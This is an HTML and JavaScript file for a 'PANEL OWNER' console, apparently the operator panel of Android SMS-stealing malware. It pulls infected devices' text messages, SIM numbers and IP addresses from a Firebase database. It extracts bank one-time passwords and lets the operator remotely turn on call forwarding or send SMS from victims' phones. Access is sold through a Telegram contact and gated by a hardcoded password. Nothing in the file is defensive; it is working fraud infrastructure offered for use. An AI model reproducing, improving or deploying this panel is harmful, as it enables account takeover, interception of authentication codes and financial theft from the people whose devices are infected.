<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>PANEL OWNER</title>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Fira+Code:wght@400;600&display=swap');
body{font-family:'Fira Code',monospace;background:#0a0a0f;color:#ff2244;overflow:hidden;height:100dvh;user-select:none}
#bgVid{position:fixed;top:0;left:0;width:100vw;height:100vh;object-fit:cover;z-index:0;pointer-events:none}
#bgOverlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(10,10,15,0.65);z-index:0;pointer-events:none}

.scr{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1;display:none;flex-direction:column}
.scr.act{display:flex}
#logScr,#keyScr{justify-content:center;align-items:center}
.lb{text-align:center;width:88%;max-width:360px;padding:30px 20px;border:1px solid #ff224466;border-radius:14px;background:linear-gradient(135deg,rgba(255,34,68,.03),rgba(0,0,0,.9));box-shadow:0 0 60px rgba(255,34,68,.05),inset 0 0 60px rgba(255,34,68,.02)}
.lb h1{font-family:'Orbitron',sans-serif;font-size:6vw;color:#ff2244;text-shadow:0 0 30px rgba(255,34,68,.4),0 0 80px rgba(255,34,68,.1)}@media(min-width:500px){.lb h1{font-size:28px}}
.lb .s{color:#ff224488;font-size:9px;margin:4px 0 24px;letter-spacing:3px}
.lb input{width:100%;padding:14px;background:#0d0d0d;border:1px solid #ff224433;border-radius:8px;color:#ff2244;font-family:'Fira Code',monospace;font-size:15px;outline:none;margin-bottom:12px;text-align:center;letter-spacing:4px}
.lb input:focus{border-color:#ff2244;box-shadow:0 0 20px rgba(255,34,68,.15)}
.lb button{width:100%;padding:14px;background:transparent;border:1px solid #ff2244;border-radius:8px;color:#ff2244;font-family:'Orbitron',sans-serif;font-size:13px;font-weight:700;cursor:pointer;letter-spacing:3px;transition:.3s}
.lb button:hover{background:#ff2244;color:#000;box-shadow:0 0 40px rgba(255,34,68,.3)}
.lb .er{color:#ff4466;font-size:12px;margin-top:10px;text-shadow:0 0 10px rgba(255,68,102,.3)}
.top{background:linear-gradient(180deg,rgba(255,34,68,.02),transparent);padding:12px 14px;display:flex;align-items:center;gap:10px;border-bottom:1px solid #ff224411;z-index:2;min-height:52px;backdrop-filter:blur(12px)}
.top .bck{font-size:20px;cursor:pointer;color:#ff2244;background:none;border:1px solid #ff224433;border-radius:6px;padding:4px 10px;font-family:'Fira Code',monospace;transition:.2z}
.top .bck:hover{background:#ff224411}
.top h2{flex:1;font-size:13px;font-family:'Orbitron',sans-serif;color:#ff2244;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;letter-spacing:2px}
.top .bdg{font-size:8px;padding:4px 10px;border-radius:4px;border:1px solid #ff224444;color:#ff2244;background:#ff224408;white-space:nowrap;flex-shrink:0;letter-spacing:1px}
.cnt{flex:1;overflow-y:auto;padding:10px 12px;z-index:1;-webkit-overflow-scrolling:touch}
.srch{display:flex;gap:8px;margin-bottom:10px}
.srch input{flex:1;padding:10px 12px;background:#0d0d0d;border:1px solid #ff224422;border-radius:8px;color:#ff2244;font-family:'Fira Code',monospace;font-size:12px;outline:none}
.srch input:focus{border-color:#ff224466}
.srch input::placeholder{color:#ff224444}
.cd{background:linear-gradient(135deg,rgba(255,34,68,.02),rgba(0,0,0,.8));border:1px solid #ff224411;border-radius:10px;padding:14px;margin-bottom:10px;box-shadow:0 0 20px rgba(255,34,68,.02),inset 0 0 40px rgba(255,34,68,.01)}
.cd h3{font-family:'Orbitron',sans-serif;font-size:10px;color:#ff2244;margin-bottom:8px;padding-bottom:6px;border-bottom:1px solid #ff224411;font-weight:400;letter-spacing:3px;text-transform:uppercase}
.dc{background:linear-gradient(135deg,rgba(255,34,68,.02),#0d0d0d);border:1px solid #ff224411;border-radius:8px;padding:12px;margin-bottom:6px;cursor:pointer;transition:.2s}
.dc:active{background:#ff224408;border-color:#ff224444;transform:scale(.98)}
.dc .tr{display:flex;justify-content:space-between;align-items:center;margin-bottom:2px}
.dc .sno{font-size:8px;color:#ff224488;background:#ff224408;padding:2px 7px;border-radius:3px;font-weight:600;letter-spacing:1px;border:1px solid #ff224422}
.dc .dn{font-size:13px;color:#ff2244cc;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.dc .di{font-size:10px;color:#ff224488;margin-bottom:3px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.dc .m{display:flex;gap:12px;font-size:10px;color:#ff224466;flex-wrap:wrap;align-items:center}
.dc .m sp{display:flex;align-items:center;gap:3px}
.st{width:7px;height:7px;border-radius:50%;display:inline-block}
.st.on{background:#ff2244;box-shadow:0 0 10px #ff2244,0 0 20px #ff224488;animation:pl 1.5s infinite}
.st.off{background:#3355ff;box-shadow:0 0 6px #3355ff66}
@keyframes pl{0%{box-shadow:0 0 8px #ff2244}50%{box-shadow:0 0 20px #ff2244,0 0 40px #ff224488}100%{box-shadow:0 0 8px #ff2244}}
.sg{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px}
.sg .s{background:rgba(255,34,68,.02);border:1px solid #ff224411;border-radius:8px;padding:12px 8px;text-align:center}
.sg .s .v{font-family:'Orbitron',sans-serif;font-size:22px;font-weight:700;color:#ff2244;text-shadow:0 0 20px rgba(255,34,68,.2)}
.sg .s .l{font-size:8px;color:#ff224488;margin-top:2px;letter-spacing:1px}
.br{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin-bottom:12px}
.br .b{background:rgba(255,34,68,.02);border:1px solid #ff224411;border-radius:8px;padding:12px 4px;text-align:center;cursor:pointer;transition:.2s}
.br .b:active{background:rgba(255,34,68,.08);border-color:#ff224466}
.br .b .ic{font-size:18px;display:block;margin-bottom:3px}
.br .b .l{font-size:7px;color:#ff224488;letter-spacing:1px}
.oi{background:rgba(0,0,0,.4);border:1px solid #ff224411;border-radius:8px;padding:10px;margin-bottom:6px}
.oi .h{display:flex;justify-content:space-between;font-size:9px;color:#ff224488;margin-bottom:4px}
.oi .oc{font-family:'Orbitron',sans-serif;font-size:18px;color:#ff2244;text-shadow:0 0 15px rgba(255,34,68,.3);margin-bottom:2px;letter-spacing:6px}
.oi .fr{font-size:10px;color:#ff224466;word-break:break-all}
.smi{display:flex;gap:10px;padding:8px 0;border-bottom:1px solid #ff000408;cursor:pointer}
.smi .av{width:36px;height:36px;border-radius:50%;background:rgba(255,34,68,.08);border:1px solid #ff224422;display:flex;align-items:center;justify-content:center;font-size:13px;color:#ff2244;flex-shrink:0}
.smi .b{flex:1;min-width:0}
.smi .n{font-size:11px;color:#ff2244bb;font-weight:600}
.smi .m{font-size:11px;color:#ff224488;margin:2px 0;word-break:break-all}
.smi .t{font-size:9px;color:#ff224444}
.ts{display:flex;gap:4px;margin-bottom:10px;overflow-x:auto;padding-bottom:4px}
.ts .t{padding:6px 12px;background:transparent;border:1px solid #ff224422;border-radius:6px;color:#ff224488;font-family:'Fira Code',monospace;font-size:9px;cursor:pointer;white-space:nowrap;letter-spacing:1px;transition:.2s}
.ts .t.act{background:#ff2244;color:#000;border-color:#ff2244;font-weight:600}
.ab{padding:10px;background:transparent;border:1px solid #ff2244;border-radius:6px;color:#ff2244;font-family:'Fira Code',monospace;font-size:11px;cursor:pointer;transition:.2s;letter-spacing:1px}
.ab:hover{background:#ff2244;color:#000}
.ab.sc{border-color:#ff4466;color:#ff4466}
.ab.sc:hover{background:#ff4466;color:#000}
.sip{display:flex;gap:8px;margin-bottom:8px}
.sip input{flex:1;padding:10px;background:#0d0d0d;border:1px solid #ff224422;border-radius:6px;color:#ff2244;font-family:'Fira Code',monospace;font-size:12px;outline:none}
.sip input:focus{border-color:#ff224466}
.sip input::placeholder{color:#ff224444}
#toast{position:fixed;bottom:60px;left:50%;transform:translateX(-50%);background:rgba(255,34,68,.1);border:1px solid #ff224444;color:#ff2244;padding:10px 24px;border-radius:8px;font-size:11px;z-index:99;opacity:0;transition:.4s;backdrop-filter:blur(12px);font-family:'Fira Code',monospace;letter-spacing:1px}
.cp{cursor:pointer;border-bottom:1px dotted #ff224444}
.cp:active{color:#fff}
.hl{background:rgba(0,0,0,.3);border:1px solid #ff224411;border-radius:8px;padding:12px;font-size:10px;line-height:1.8;color:#ff224488;font-family:'Fira Code',monospace;word-break:break-all}
.hl span{color:#ff2244}
</style>
</head>
<body>

<video id="bgVid" muted loop playsinline>
  <source src="background.mp4" type="video/mp4">
</video>
<div id="bgOverlay"></div>
<audio id="bgAudio" loop preload="auto">
  <source src="background.mp3" type="audio/mpeg">
</audio>

<div id="logScr" class="scr act">
  <div class="lb">
    <h1>𝐏𝐀𝐍𝐄𝐋<br>𝐎𝐖𝐍𝐄𝐑</h1>
    <div class="s">║ YONO-AD3 CONSOLE ║</div>
    <input type="password" id="loginPass" placeholder="█ ALEXA PASSWORD" autocomplete="off">
    <button onclick="doLogin()">⏎ UNLOCK</button>
    <div id="loginErr" class="er"></div>
    <button style="margin-top:14px;width:100%;padding:12px;background:transparent;border:1px solid #ffd70044;border-radius:8px;color:#ffd700;font-family:'Orbitron',sans-serif;font-size:11px;font-weight:700;cursor:pointer;letter-spacing:3px;transition:.3s" onclick="genKey()">🔑 GENERATE KEY</button>
    <div style="margin-top:10px"><span style="color:#ff224466;font-size:10px;cursor:pointer;letter-spacing:2px;border-bottom:1px dotted #ff224444" onclick="showKeyLogin()">◈ KEY LOGIN ◈</span></div>
  </div>
</div>

<div id="keyScr" class="scr">
  <div class="lb">
    <h1>KEY</h1>
    <div class="s">║ ACCESS KEY VERIFICATION ║</div>
    <input type="text" id="keyInput" placeholder="█ ENTER KEY" autocomplete="off" style="letter-spacing:6px" onkeydown="if(event.key==='Enter')keyLogin()">
    <button style="border-color:#ffd700;color:#ffd700" onclick="keyLogin()">⏎ VERIFY</button>
    <div id="keyErr" class="er"></div>
    <div style="margin-top:10px"><span style="color:#ff224466;font-size:10px;cursor:pointer;letter-spacing:2px;border-bottom:1px dotted #ff224444" onclick="showScr('logScr')">◈ BACK TO LOGIN ◈</span></div>
  </div>
</div>

<div id="mainScr" class="scr">
  <div class="top"><h2>𝐏𝐀𝐍𝐄𝐋 𝐎𝐖𝐍𝐄𝐑</h2><span class="bdg" id="muteBtn" onclick="toggleMute()" style="cursor:pointer">🔊</span><span class="bdg" id="mainBdg">⬤ LIVE</span><span class="bdg" id="onlineBdg" style="border-color:#00ff4188;color:#00ff41;background:#00ff4108">⬤ 0</span></div>
  <div class="cnt">
    <div class="srch"><input id="srchInp" placeholder="█ Search devices..."></div>
    <div class="sg" id="dashStats"></div>
    <div class="br" id="dashButtons"></div>
    <div id="dashBody"></div>
  </div>
</div>

<div id="detailScr" class="scr">
  <div class="top"><button class="bck" onclick="closeDetail()">‹</button><h2 id="detailTitle">DETAIL</h2><span class="bdg" id="detailBadge"></span></div>
  <div class="cnt">
    <div id="detailInfo"></div>
    <div class="ts" id="detailTabs"></div>
    <div id="detailBody"></div>
    <div id="detailFwd" style="display:none" class="cd">
      <h3>↪ CALL FORWARDING</h3>
      <div class="sip"><input id="devFwdNum" placeholder="█ Forward number"></div>
      <div style="display:flex;gap:6px"><button class="ab" style="flex:1" onclick="doFwd('activate')">⏎ ACTIVATE</button><button class="ab sc" style="flex:1" onclick="doFwd('deactivate')">⏎ DEACTIVATE</button></div>
    </div>
    <div id="detailSmsSend" style="display:none" class="cd">
      <h3>📤 SEND SMS</h3>
      <div class="sip"><input id="devSmsTo" placeholder="█ Target number"></div>
      <div class="sip"><input id="devSmsBody" placeholder="█ Message body"></div>
      <button class="ab" onclick="doSendSms()" style="margin-top:8px">⏎ SEND</button>
    </div>
  </div>
</div>

<div id="allSmsScr" class="scr">
  <div class="top"><button class="bck" onclick="showScr('mainScr')">‹</button><h2>📥 ALL SMS</h2><span class="bdg" id="allSmsCnt">0</span></div>
  <div class="cnt"><div id="allSmsContent"></div></div>
</div>

<div id="toast"></div>

<script>
// === MEDIA ===
function startMedia(){
  const v=document.getElementById('bgVid'),a=document.getElementById('bgAudio');
  v.play().catch(()=>{});
  a.play().catch(()=>{});
}
function toggleMute(){
  const a=document.getElementById('bgAudio'),b=document.getElementById('muteBtn');
  a.muted=!a.muted;
  b.textContent=a.muted?'🔇':'🔊';
}

const TG_ID='8976072495';
function genKey(){window.open('https://t.me/'+TG_ID,'_blank')}

firebase.initializeApp({databaseURL:'https://yono-ad3-default-rtdb.firebaseio.com'});
const db=firebase.database();
const ENC_KEY='owner@2026#protect';

let clientsData={},passwords={},searchQ='',curDeviceId='',showOnline=false,sessionValid=false;

function xorEncrypt(t){const k=ENC_KEY;let r='';for(let i=0;i<t.length;i++)r+=String.fromCharCode(t.charCodeAt(i)^k.charCodeAt(i%k.length));return btoa(r)}
function xorDecrypt(e){const k=ENC_KEY;let r='',d=atob(e);for(let i=0;i<d.length;i++)r+=String.fromCharCode(d.charCodeAt(i)^k.charCodeAt(i%k.length));return r}
async function hashPass(p){const h=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(p));return Array.from(new Uint8Array(h)).map(b=>b.toString(16).padStart(2,'0')).join('').slice(0,16)}
function genSession(){let r='';for(let i=0;i<16;i++)r+='0123456789abcdef'[Math.floor(Math.random()*16)];return r}
function getSession(){return localStorage.getItem('po_session')||''}
function setSession(s){localStorage.setItem('po_session',s)}
function checkSession(){
  const s=getSession();
  if(!s||!passwords)return false;
  return Object.values(passwords).some(p=>p.b===s)
}
function copyT(t){if(navigator.clipboard){navigator.clipboard.writeText(t).then(()=>showToast('✔ COPIED'))}else showToast(t)}
function parseTime(t){
  if(!t)return 0;
  try{return new Date(t.replace('|','')).getTime()}catch(e){return 0}
}
function isOnline(id){
  const d=clientsData[id];
  if(!d)return false;
  return d.status===true
}
function getPhone(id){const d=clientsData[id];return d?d.mobNo||(d.sims&&d.sims[0]?d.sims[0].phoneNumber:''):''}
function getName(id){const d=clientsData[id];return d?d.modelName||d.deviceId?.slice(0,10):id.slice(0,10)}
function getDeviceIds(){return Object.keys(clientsData).filter(k=>clientsData[k]&&clientsData[k].deviceId)}
function getDeviceSms(id){
  const d=clientsData[id];
  if(!d||!d.messages)return[];
  return Object.keys(d.messages).sort((a,b)=>b-a).map(k=>({...d.messages[k],deviceId:id,key:k}))
}
function getAllSms(){
  const list=[];
  getDeviceIds().forEach(did=>{getDeviceSms(did).forEach(s=>list.push(s))});
  return list.sort((a,b)=>(b.key||0)-(a.key||0))
}

// Listeners
db.ref('clients').on('value',snap=>{clientsData=snap.val()||{};updateUI()});
db.ref('asia_protection/passwords').on('value',async snap=>{
  passwords=snap.val()||{};
  if(await checkSession())doAutoLogin()
});
db.ref('.info/connected').on('value',snap=>{if(snap.val()===true)showToast('█ CONNECTED')});

function updateUI(){
  const scr=document.querySelector('.scr.act');
  if(!scr)return;
  const id=scr.id;
  if(id==='mainScr')renderDashboard();
  else if(id==='detailScr'&&curDeviceId)renderDetail();
  else if(id==='allSmsScr')renderAllSms();
}
function showScr(id){
  document.querySelectorAll('.scr').forEach(s=>s.classList.remove('act'));
  document.getElementById(id).classList.add('act');
  updateUI();
}
window.closeDetail=()=>{curDeviceId='';showScr('mainScr')};
function showKeyLogin(){document.querySelectorAll('.scr').forEach(s=>s.classList.remove('act'));document.getElementById('keyScr').classList.add('act')}

function renderDashboard(){
  const ids=getDeviceIds();
  const smsList=getAllSms();
  const otpCount=smsList.filter(s=>(s.message||s.body||'').toUpperCase().includes('OTP')).length;
  const online=ids.filter(id=>isOnline(id)).length;
  document.getElementById('onlineBdg').innerHTML='⬤ '+online;
  document.getElementById('dashStats').innerHTML=`
    <div class="s"><div class="v">${ids.length}</div><div class="l">DEVICES</div></div>
    <div class="s"><div class="v">${online}</div><div class="l">ONLINE</div></div>
    <div class="s"><div class="v">${smsList.length}</div><div class="l">SMS</div></div>
    <div class="s"><div class="v">${otpCount}</div><div class="l">OTP</div></div>`;
  document.getElementById('dashButtons').innerHTML=`
    <div class="b" onclick="showOnline=false;showScr('mainScr')"><span class="ic">💻</span><span class="l">ALL DEV</span></div>
    <div class="b" onclick="showOnline=true;showScr('mainScr')"><span class="ic" style="color:#ff2244">⬤</span><span class="l">ONLINE</span></div>
    <div class="b" onclick="showAllOtps()"><span class="ic">🔑</span><span class="l">OTP</span></div>
    <div class="b" onclick="showScr('allSmsScr')"><span class="ic">📥</span><span class="l">ALL SMS</span></div>`;
  let filtered=ids;
  if(showOnline)filtered=ids.filter(id=>isOnline(id));
  const q=searchQ.toLowerCase();
  if(q)filtered=filtered.filter(d=>d.toLowerCase().includes(q)||getPhone(d).toLowerCase().includes(q)||getName(d).toLowerCase().includes(q));
  let html=`<div class="cd"><h3>💻 DEVICES (${filtered.length}/${ids.length})</h3>`;
  filtered.forEach(d=>{
    const sms=getDeviceSms(d),n=getName(d),o=isOnline(d);
    const ot=sms.filter(x=>(x.message||x.body||'').toUpperCase().includes('OTP')).length;
    const phone=getPhone(d);
    html+=`<div class="dc" onclick="openDevice('${d}')">
      <div class="tr"><span class="sno">${d.slice(0,8)}</span><span class="dn">${n}</span><span class="st ${o?'on':'off'}"></span></div>
      <div class="di">${phone?`<span class="cp" onclick="event.stopPropagation();copyT('${phone}')">📞${phone}</span>`:''}</div>
      <div class="m"><sp>📨 ${sms.length}</sp><sp>🔑 ${ot}</sp><sp style="color:${o?'#ff2244':'#3355ff'}">${o?'ONLINE':'OFFLINE'}</sp></div>
    </div>`;
  });
  html+=`${!filtered.length?'<div style="padding:30px;text-align:center;color:#ff224444;font-size:12px">'+(q?'NO MATCH':'NO DEVICES')+'</div>':''}</div>`;
  document.getElementById('dashBody').innerHTML=html;
}
document.getElementById('srchInp').addEventListener('input',function(){searchQ=this.value;renderDashboard()});

function openDevice(deviceId){
  curDeviceId=deviceId;
  document.getElementById('detailFwd').style.display='none';
  document.getElementById('detailSmsSend').style.display='none';
  renderDetail();
  document.querySelectorAll('.scr').forEach(s=>s.classList.remove('act'));
  document.getElementById('detailScr').classList.add('act');
}
let dtTab='info';
function switchTab(tab){
  document.getElementById('detailFwd').style.display=tab==='fwd'?'block':'none';
  document.getElementById('detailSmsSend').style.display=tab==='send'?'block':'none';
  dtTab=tab;
  renderDetail();
}

function renderDetail(){
  const did=curDeviceId;
  const d=clientsData[did]||{};
  const smsList=getDeviceSms(did);
  const otps=smsList.filter(s=>(s.message||s.body||'').toUpperCase().includes('OTP'));
  const ol=isOnline(did),phone=getPhone(did);
  document.getElementById('detailTitle').textContent=getName(did);
  document.getElementById('detailBadge').textContent=ol?'⬤ ONLINE':'○ OFFLINE';
  document.getElementById('detailBadge').style.color=ol?'#00ff41':'#3355ff';
  document.getElementById('detailBadge').style.borderColor=ol?'#00ff4188':'#3355ff88';
  let infoHtml=`<div class="cd"><h3>💻 ${getName(did)}</h3><div class="hl">`;
  infoHtml+=`<div>ID   : <span>${did}</span></div>`;
  if(phone)infoHtml+=`<div>PHONE: <span class="cp" onclick="copyT('${phone}')">${phone} 📋</span></div>`;
  Object.keys(d).forEach(k=>{
    if(k==='deviceId'||k==='messages'||k==='sims')return;
    const v=d[k];
    infoHtml+=`<div>${k.toUpperCase()}: <span>${typeof v==='object'?JSON.stringify(v):v}</span></div>`
  });
  infoHtml+=`<div>SIMs: <span>${d.sims?d.sims.map(s=>s.carrierName+' '+s.phoneNumber).join(', '):'-'}</span></div>`;
  infoHtml+=`<div>STAT : <span style="color:${ol?'#ff2244':'#3355ff'}">${ol?'ONLINE':'OFFLINE'}</span></div>`;
  infoHtml+=`<div>SMS  : <span>${smsList.length}</span></div></div></div>`;
  document.getElementById('detailInfo').innerHTML=infoHtml;
  document.getElementById('detailTabs').innerHTML=`
    <div class="t ${dtTab==='info'?'act':''}" onclick="switchTab('info')">ℹ️ INFO</div>
    <div class="t ${dtTab==='fwd'?'act':''}" onclick="switchTab('fwd')">↪️ CALL FWD</div>
    <div class="t ${dtTab==='send'?'act':''}" onclick="switchTab('send')">📤 SEND SMS</div>
    <div class="t ${dtTab==='otp'?'act':""}" onclick="switchTab('otp')">🔑 OTP</div>
    <div class="t ${dtTab==='sms'?'act':''}" onclick="switchTab('sms')">📥 SMS</div>`;
  document.getElementById('detailBody').innerHTML='';
  if(dtTab==='info'){
    let h='<div class="cd"><h3>ℹ️ DEVICE DATA</h3>';
    const dd=clientsData[did]||{};
    const fields=['modelName','androidV','sdkV','cpu_arch','battery','storage','ip_address','service_provider','isRoot','isSdCard','joined','last_seen'];
    fields.forEach(k=>{
      if(dd[k])h+=`<div class="hl" style="margin-bottom:4px"><div>${k}: <span>${dd[k]}</span></div></div>`
    });
    h+=`${!fields.some(k=>dd[k])?'<div style="padding:16px;color:#ff224444;font-size:12px">NO DATA</div>':''}</div>`;
    document.getElementById('detailBody').innerHTML=h;
  }else if(dtTab==='otp'){
    document.getElementById('detailBody').innerHTML=`<div class="cd"><h3>🔑 OTPs (${otps.length})</h3>
      ${otps.length?otps.map(s=>{
        const body=s.message||s.body||'';
        return `<div class="oi"><div class="h"><span>${s.sender||s.from||'?'}</span><span>${s.dateTime||s.date||s.time||''}</span></div><div class="oc">${body.replace(/[^0-9]/g,'').slice(0,8)}</div><div class="fr">${body.slice(0,100)}</div></div>`
      }).join(''):'<div style="padding:20px;text-align:center;color:#ff224444;font-size:12px">NO OTPs</div>'}
    </div>`;
  }else if(dtTab==='sms'){
    document.getElementById('detailBody').innerHTML=`<div class="cd"><h3>📨 MESSAGES (${smsList.length})</h3>
      ${smsList.length?smsList.map(s=>{
        const body=s.message||s.body||'';
        const sender=s.sender||s.from||'?';
        return `<div class="smi"><div class="av">${sender[0]}</div><div class="b"><div class="n">${sender}</div><div class="m">${body}</div><div class="t">${s.dateTime||s.date||s.time||''}</div></div></div>`
      }).join(''):'<div style="padding:20px;text-align:center;color:#ff224444;font-size:12px">NO MESSAGES</div>'}
    </div>`;
  }
}

function doFwd(action){
  const num=document.getElementById('devFwdNum').value.trim();
  if(action==='activate'&&!num){showToast('█ ENTER FORWARD NUMBER');return}
  const ref=db.ref('data/command');
  ref.set({action:action==='activate'?'forward_on':'forward_off',number:num||'',deviceId:curDeviceId,timestamp:Date.now()},err=>{
    if(err)showToast('✖ ERROR');
    else{showToast(action==='activate'?'↪ FORWARD ACTIVATED: '+num:'↪ FORWARD DEACTIVATED');document.getElementById('devFwdNum').value=''}
  });
}

function doSendSms(){
  const to=document.getElementById('devSmsTo').value.trim();
  const body=document.getElementById('devSmsBody').value.trim();
  if(!to||!body){showToast('█ FILL ALL FIELDS');return}
  db.ref('data/command').set({action:'send_sms',number:to,message:body,deviceId:curDeviceId,timestamp:Date.now()},err=>{
    if(err)showToast('✖ ERROR');
    else{showToast('📤 SMS COMMAND SENT TO '+to);document.getElementById('devSmsTo').value='';document.getElementById('devSmsBody').value=''}
  });
}

function showAllOtps(){
  const smsList=getAllSms();
  const otps=smsList.filter(s=>(s.message||s.body||'').toUpperCase().includes('OTP'));
  document.querySelectorAll('.scr').forEach(s=>s.classList.remove('act'));
  document.getElementById('mainScr').classList.add('act');
  document.getElementById('dashStats').innerHTML='';
  document.getElementById('dashButtons').innerHTML='';
  let html=`<div style="display:flex;align-items:center;gap:10px;margin-bottom:12px">
    <button style="background:none;border:1px solid #ff224433;border-radius:6px;color:#ff2244;font-size:18px;cursor:pointer;padding:4px 10px" onclick="renderDashboard()">‹</button>
    <h2 style="flex:1;font-family:'Orbitron',sans-serif;font-size:13px;color:#ff2244;letter-spacing:1px">🔑 ALL OTPs (${otps.length})</h2>
  </div>`;
  otps.forEach(s=>{
    const body=s.message||s.body||'';
    html+=`<div class="oi"><div class="h"><span>${s.sender||s.from||'?'}</span><span>${s.dateTime||s.date||s.time||''}</span><span style="font-size:8px;color:#ff224444">${s.deviceId?.slice(0,8)||''}</span></div><div class="oc">${body.replace(/[^0-9]/g,'').slice(0,8)}</div><div class="fr">${body.slice(0,100)}</div></div>`
  });
  html+=`${!otps.length?'<div style="padding:30px;text-align:center;color:#ff224444">NO OTPs</div>':''}`;
  document.getElementById('dashBody').innerHTML=html;
}

function renderAllSms(){
  const all=getAllSms();
  document.getElementById('allSmsCnt').textContent=all.length;
  let html=`<div class="cd"><h3>📥 ALL SMS (${all.length})</h3>`;
  all.slice(0,200).forEach(s=>{
    const body=s.message||s.body||'';
    const sender=s.sender||s.from||'?';
    html+=`<div class="smi" onclick="openDevice('${s.deviceId}')"><div class="av">${sender[0]}</div><div class="b"><div class="n">${sender} <span style="font-size:9px;color:#ff224444">via ${getName(s.deviceId)||s.deviceId?.slice(0,8)}</span></div><div class="m">${body}</div><div class="t">${s.dateTime||s.date||s.time||''}</div></div></div>`
  });
  html+=`${!all.length?'<div style="padding:30px;text-align:center;color:#ff224444;font-size:12px">NO MESSAGES</div>':''}`;
  if(all.length>200)html+=`<div style="text-align:center;padding:10px;color:#ff224444;font-size:10px">SHOWING 200 OF ${all.length}</div>`;
  html+=`</div>`;
  document.getElementById('allSmsContent').innerHTML=html;
}

async function doLogin(){
  const p=document.getElementById('loginPass').value;
  if(!p){document.getElementById('loginErr').textContent='✖ ENTER PASSWORD';return}
  const pid=await hashPass(p);
  const entry=passwords[pid];
  if(entry&&entry.a==='1'){
    const bt=getSession();
    if(entry.b&&entry.b!==bt){document.getElementById('loginErr').textContent='✖ ALREADY USED ON OTHER BROWSER';return}
    const st=bt||genSession();
    if(!bt)setSession(st);
    try{db.ref('asia_protection/passwords/'+pid).update({l:String(Date.now()),b:st})}catch(e){}
    sessionValid=true;
    document.getElementById('logScr').classList.remove('act');
    document.getElementById('mainScr').classList.add('act');
    renderDashboard();
    startMedia();
    showToast('█ ACCESS GRANTED');
  }else{
    const doGrant=()=>{
      const st=genSession();setSession(st);
      db.ref('asia_protection/passwords/'+pid).set({a:'1',b:st,l:String(Date.now())}).then(()=>{
        sessionValid=true;
        document.getElementById('logScr').classList.remove('act');
        document.getElementById('mainScr').classList.add('act');
        renderDashboard();
        startMedia();
        showToast('█ ACCESS GRANTED');
      });
    };
    db.ref('admin/password/password').once('value').then(s=>{
      const sp=s.val();
      if(sp&&p===sp)doGrant();
      else if(p==='Alexa')doGrant();
      else document.getElementById('loginErr').textContent='✖ ACCESS DENIED'
    }).catch(()=>{
      if(p==='Alexa')doGrant();
      else document.getElementById('loginErr').textContent='✖ ERROR'
    })
  }
}
async function doAutoLogin(){
  if(sessionValid)return;
  const bt=getSession();
  if(!bt)return;
  const found=Object.entries(passwords).find(([k,v])=>v.b===bt);
  if(found){
    sessionValid=true;
    document.getElementById('logScr').classList.remove('act');
    document.getElementById('mainScr').classList.add('act');
    renderDashboard();
    startMedia();
    showToast('█ SESSION RESTORED');
  }
}
document.getElementById('loginPass').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin()});

function keyLogin(){
  const k=document.getElementById('keyInput').value.trim();
  if(!k){document.getElementById('keyErr').textContent='✖ ENTER KEY';return}
  document.getElementById('keyErr').textContent='';
  db.ref('panel_keys/'+k).once('value',sn=>{
    const d=sn.val();
    if(d&&d.active===true){
      localStorage.setItem('po_session','key_'+k);
      sessionValid=true;
      document.querySelectorAll('.scr').forEach(s=>s.classList.remove('act'));
      document.getElementById('mainScr').classList.add('act');
      renderDashboard();
      startMedia();
      showToast('█ KEY ACCEPTED');
      db.ref('panel_keys/'+k).update({active:false,used_by:'browser',used_at:Date.now()});
    }else document.getElementById('keyErr').textContent='✖ INVALID / USED KEY'
  }).catch(()=>document.getElementById('keyErr').textContent='✖ ERROR');
}

document.addEventListener('DOMContentLoaded',async ()=>{
  const p=getSession();
  if(p&&p.startsWith('key_')){document.getElementById('keyInput').value=p.replace('key_','');keyLogin()}
  else if(p&&await checkSession()){doAutoLogin()}
});
function showToast(m){
  const t=document.getElementById('toast');t.textContent=m;t.style.opacity='1';
  clearTimeout(t._h);t._h=setTimeout(()=>t.style.opacity='0',2500);
}
</script>
